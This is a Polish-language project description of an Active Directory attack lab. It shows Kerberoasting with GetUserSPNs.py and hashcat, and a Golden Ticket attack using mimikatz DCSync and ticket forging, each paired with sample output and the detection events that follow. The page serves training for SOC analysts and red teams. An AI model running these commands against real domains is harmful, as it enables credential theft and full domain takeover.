Przegląd Projektu

Active Directory Compromise Lab to kompleksowe środowisko testowe do badania i symulacji zaawansowanych ataków na infrastrukturę Active Directory. Laboratorium umożliwia symulację ataków takich jak Golden Ticket, Silver Ticket, Kerberoasting, Pass-the-Hash oraz DCSync w kontrolowanym środowisku, jednocześnie testując mechanizmy wykrywania i obrony. Projekt służy do doskonalenia umiejętności SOC analityków i Red Team operatorów.

Kerberoasting Attack Simulation

Kerberoasting to technika ataku polegająca na żądaniu biletów TGS dla kont usługowych posiadających SPN (Service Principal Name). Uzyskane bilety można łamać offline przy użyciu narzędzi takich jak Hashcat lub John the Ripper, bez generowania alertów w domenie.

attacker@kali:~$ python3 GetUserSPNs.py lab.local/jsmith:Password123 -dc-ip 192.168.10.10 -request
[*] Getting credentials for all users with SPNs...
ServicePrincipalName Name MemberOf
----------------------------------- --------- --------
HTTP/webserver.lab.local svc_iis Domain Users
MSSQLSvc/sqlserver.lab.local:1433 svc_mssql Domain Admins
$krb5tgs$23$*svc_mssql$LAB.LOCAL$...[hash truncated]
attacker@kali:~$ hashcat -m 13100 hashes.txt rockyou.txt --force
⚡ svc_mssql:Summer2023! [CRACKED in 4.2 seconds]
🎯 Attack Success - Detection Alert

Windows Event ID 4769 (Kerberos Service Ticket Requested) generated. RC4 encryption (0x17) requested for service ticket — strong indicator of Kerberoasting. SIEM rule triggered: HIGH severity alert.

Golden Ticket Attack

Golden Ticket to atak polegający na sfałszowaniu biletu TGT (Ticket Granting Ticket) przy użyciu skrótu NTLM konta krbtgt. Pozwala na uzyskanie nieograniczonego dostępu do wszystkich zasobów domeny przez okres do 10 lat, nawet po zmianie hasła użytkownika.

# Step 1: Extract krbtgt hash via DCSync
mimikatz # lsadump::dcsync /domain:lab.local /user:krbtgt
Object RDN : krbtgt
Hash NTLM: 7c9d7e3f2a1b4c5d6e7f8a9b0c1d2e3f
# Step 2: Create Golden Ticket
mimikatz # kerberos::golden /user:Administrator /domain:lab.local /sid:S-1-5-21-xxx /krbtgt:7c9d... /ptt
✓ Golden ticket forged and injected into current session
# Step 3: Access domain resources
cmd.exe # dir \\DC01\C$
Volume in drive \\DC01\C$ is Windows
Directory of \\DC01\C$: [Full access granted]
⚠ Critical: Detection Evasion Analysis
  • • Event ID 4624 (Account Logon) — anomalous ticket lifetime detected
  • • Ticket lifetime: 10 years vs domain default 10 hours
  • • SID history anomaly: extra SID S-1-5-18 injected
  • • Detection confidence: 97.3%
